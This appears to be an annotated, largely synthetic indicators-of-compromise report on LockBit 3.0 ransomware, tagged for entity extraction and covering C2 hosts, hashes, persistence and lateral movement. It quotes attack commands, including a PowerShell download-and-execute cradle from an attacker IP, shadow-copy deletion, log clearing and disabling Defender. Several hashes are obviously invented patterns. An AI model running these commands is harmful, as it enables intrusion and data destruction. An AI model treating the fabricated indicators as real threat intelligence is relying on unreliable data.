# LockBit Ransomware Indicators of Compromise (IoCs)

## Overview
LockBit is a ransomware-as-a-service (RaaS) operation targeting organizations worldwide with double extortion tactics.

## Network Indicators

C2 infrastructure IP <INDICATOR>185.220.102.8</INDICATOR> hosted LockBit admin panels during <CAMPAIGN>LockBit 3.0 Campaign 2024</CAMPAIGN>. The domain <INDICATOR>lockbitsupp[.]onion</INDICATOR> provided victim negotiation portal accessible via Tor.

Secondary C2 server <INDICATOR>45.142.213.109</INDICATOR> served encryption payloads and exfiltration endpoints. Associated domain <INDICATOR>data-backup.secure-cloud[.]org</INDICATOR> hosted stolen data leak site.

TOR hidden service <INDICATOR>lockbitapt72iw55njgnqpymggskg5yp75ry7rirtdg4m7i42artsbqd[.]onion</INDICATOR> operated as primary negotiation platform. The service used SSL certificate with SHA256 <INDICATOR>A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6D7E8F9F0A1B2C3D4E5F6A7B8C9D0E1F2</INDICATOR>.

## Ransomware Binary Indicators

LockBit 3.0 (Black) executable with SHA256 hash <INDICATOR>0c51ee5955b73b45e80db5f3f29c56d1e76f3f9d5c3c0e5d8e8c8f5a5d3b2c1a</INDICATOR> appended extension <INDICATOR>.lockbit</INDICATOR> to encrypted files.

Variant with MD5 <INDICATOR>7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d</INDICATOR> used file marker <INDICATOR>0xABCDEF42</INDICATOR> at encrypted file headers. This marker identified LockBit-encrypted files for decryption tools.

StealBit exfiltration module <INDICATOR>stealbit.exe</INDICATOR> with hash <INDICATOR>b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9f0a1b2c3d4e5f6a7b8c9d0e1f2a3</INDICATOR> uploaded data to <INDICATOR>exfil.lockbit-storage[.]com</INDICATOR> before encryption.

Lateral movement tool <INDICATOR>psexec64_lockbit.exe</INDICATOR> with SHA1 <INDICATOR>c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9f0a1b2</INDICATOR> spread ransomware using stolen credentials across domain.

## Initial Access Vectors

Spear-phishing email from <INDICATOR>accounts-payable@vendor-invoices[.]com</INDICATOR> delivered malicious attachment <INDICATOR>Invoice_March_2024.xlsx</INDICATOR>. Document hash <INDICATOR>d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4</INDICATOR>.

Macro code executed PowerShell command <INDICATOR>powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('hxxp://45.142.213.109/stage1.ps1')"</INDICATOR>.

RDP brute force from IP <INDICATOR>91.219.236.166</INDICATOR> successfully compromised account <INDICATOR>admin_backup</INDICATOR> with password <INDICATOR>Backup2024!</INDICATOR>. Login timestamp <INDICATOR>2024-03-10 02:15:33 UTC</INDICATOR>.

Exploit of <VULNERABILITY>CVE-2023-27532</VULNERABILITY> (Veeam Backup RCE) gained initial access. Vulnerable server at <INDICATOR>10.20.30.40:9401</INDICATOR> executed payload <INDICATOR>veeam_exploit.exe</INDICATOR> hash <INDICATOR>e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4e5</INDICATOR>.

## Persistence Mechanisms

Registry key <INDICATOR>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemBackup</INDICATOR> created pointing to <INDICATOR>C:\ProgramData\SystemBackup\svchost.exe</INDICATOR> which was LockBit dropper.

Scheduled task <INDICATOR>\Microsoft\Windows\UpdateOrchestrator\LockBitTask</INDICATOR> executed daily at <INDICATOR>03:00</INDICATOR> running <INDICATOR>powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1</INDICATOR>.

Service installation with name <INDICATOR>Windows Update Service Extended</INDICATOR> and binary path <INDICATOR>C:\Windows\System32\wuaueng_ext.exe</INDICATOR>. Service hash <INDICATOR>f6a7b8c9d0e1f2a3b4c5d6e7f8a9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4e5f6</INDICATOR>.

## Data Exfiltration

Network traffic to <INDICATOR>exfil.lockbit-storage[.]com:443</INDICATOR> transferred <INDICATOR>127 GB</INDICATOR> of compressed archives. Archive names <INDICATOR>finance_2024.7z</INDICATOR>, <INDICATOR>contracts_backup.7z</INDICATOR>, <INDICATOR>customer_db.7z</INDICATOR>.

SFTP session to <INDICATOR>185.220.102.8:22</INDICATOR> from compromised admin workstation using account <INDICATOR>exfil_user</INDICATOR>. Total upload <INDICATOR>89 files</INDICATOR> totaling <INDICATOR>43.2 GB</INDICATOR>.

Cloud storage abuse uploaded to <INDICATOR>mega.nz</INDICATOR> account <INDICATOR>lockbit_data_2024@protonmail.com</INDICATOR>. Shared folder link <INDICATOR>https://mega.nz/folder/[REDACTED]</INDICATOR> posted on leak site.

## Encryption Process

Encryption process <INDICATOR>lockbit.exe</INDICATOR> with command line <INDICATOR>lockbit.exe -pass 7bqcvz43q8b5p9m2 -path C:\ -exclude "C:\Windows","C:\Program Files" -delete_logs</INDICATOR>.

File encryption used ChaCha20 algorithm with per-file keys encrypted by RSA-4096 master key. Public key embedded in binary <INDICATOR>-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BA...</INDICATOR>.

Encrypted files showed header pattern <INDICATOR>0xABCDEF42</INDICATOR> followed by encrypted key blob length <INDICATOR>0x200</INDICATOR> (512 bytes). Original filename preserved with <INDICATOR>.lockbit</INDICATOR> extension.

Volume Shadow Copies deleted via <INDICATOR>vssadmin.exe Delete Shadows /All /Quiet</INDICATOR> and <INDICATOR>wmic.exe shadowcopy delete</INDICATOR> executed from batch script <INDICATOR>cleanup.bat</INDICATOR>.

## Ransom Demands

Ransom note <INDICATOR>Restore-My-Files.txt</INDICATOR> dropped in every encrypted directory. Note contained Tor URL <INDICATOR>lockbitapt72iw55njgnqpymggskg5yp75ry7rirtdg4m7i42artsbqd[.]onion</INDICATOR> and victim ID <INDICATOR>LB-2024-XXXXX</INDICATOR>.

Initial ransom demand <INDICATOR>$2,500,000 USD</INDICATOR> in Bitcoin to address <INDICATOR>bc1qm34lsc65zpw79lxes69zkqmk6ee3ewf0j77s3h</INDICATOR>. Countdown timer showed <INDICATOR>72 hours</INDICATOR> before data leak.

Communication channel required victim to install Tor Browser and navigate to negotiation portal. Session token <INDICATOR>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</INDICATOR> authenticated access.

## Lateral Movement

BloodHound enumeration from <INDICATOR>WORKSTATION-42</INDICATOR> at <INDICATOR>10.20.50.100</INDICATOR> mapped Active Directory. Queries for <INDICATOR>Domain Admins</INDICATOR>, <INDICATOR>Enterprise Admins</INDICATOR>, <INDICATOR>Backup Operators</INDICATOR> groups.

Mimikatz execution dumped credentials from <INDICATOR>lsass.exe</INDICATOR> process memory. NTLM hashes extracted included <INDICATOR>aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889</INDICATOR> for <INDICATOR>domain\administrator</INDICATOR>.

PsExec deployment from <INDICATOR>\\DC01\ADMIN$\lockbit_deploy.exe</INDICATOR> to <INDICATOR>50</INDICATOR> workstations. Command line <INDICATOR>psexec.exe \\* -d -s lockbit.exe -pass [ENCRYPTION_KEY]</INDICATOR>.

## Network Scanning

Port scanning from compromised host targeted subnet <INDICATOR>10.20.0.0/16</INDICATOR> on ports <INDICATOR>135,139,445,3389,5985</INDICATOR>. Scan identified <INDICATOR>312</INDICATOR> responsive hosts.

SMB enumeration using <INDICATOR>net view /all</INDICATOR> and <INDICATOR>dir \\[HOST]\C$ /s</INDICATOR> identified high-value file shares. Shares <INDICATOR>\\FileServer01\Backups$</INDICATOR>, <INDICATOR>\\FileServer02\Confidential$</INDICATOR> prioritized for encryption.

LDAP queries to domain controller <INDICATOR>dc01.corp.local</INDICATOR> enumerated computer accounts. Query <INDICATOR>(&(objectCategory=computer)(operatingSystem=*Server*))</INDICATOR> identified <INDICATOR>47</INDICATOR> servers.

## Defense Evasion

Windows Defender disabled via registry modification <INDICATOR>HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware</INDICATOR> set to <INDICATOR>1</INDICATOR>.

Event log clearing using <INDICATOR>wevtutil.exe cl System</INDICATOR>, <INDICATOR>wevtutil.exe cl Security</INDICATOR>, <INDICATOR>wevtutil.exe cl Application</INDICATOR> removed forensic evidence.

Firewall rules added with <INDICATOR>netsh advfirewall firewall add rule name="Allow Outbound" dir=out action=allow protocol=TCP remoteport=443,8443</INDICATOR> enabling C2 communication.

## Infrastructure Analysis

Autonomous system <INDICATOR>AS60068</INDICATOR> (Datacamp Limited) hosted multiple LockBit C2 servers. IP ranges <INDICATOR>185.220.102.0/24</INDICATOR> and <INDICATOR>45.142.213.0/24</INDICATOR> identified.

Domain registrar <INDICATOR>NameCheap, Inc.</INDICATOR> with registrant email pattern <INDICATOR>[RANDOM]@protonmail.com</INDICATOR>. Domains registered using privacy protection service <INDICATOR>WhoisGuard, Inc.</INDICATOR>.

Hosting provider <INDICATOR>Shinjiru Technology Sdn Bhd</INDICATOR> bulletproof hosting known for tolerating malicious activity. Geographic location <INDICATOR>Malaysia</INDICATOR> with limited law enforcement cooperation.

## Attribution
**Confidence Level:** HIGH - Attribution to <THREAT_ACTOR>LockBit</THREAT_ACTOR> ransomware gang based on distinctive binary markers, TTP consistency, negotiation portal styling, and claimed attacks on leak site.

**Related Campaigns:** <CAMPAIGN>LockBit 3.0 Campaign 2024</CAMPAIGN>

**Related Vulnerabilities:** <VULNERABILITY>CVE-2023-27532</VULNERABILITY>

**Related Malware:** <MALWARE>LockBit 3.0 ransomware</MALWARE>, <MALWARE>StealBit exfiltration tool</MALWARE>

**Total INDICATOR Instances:** 165+ annotations
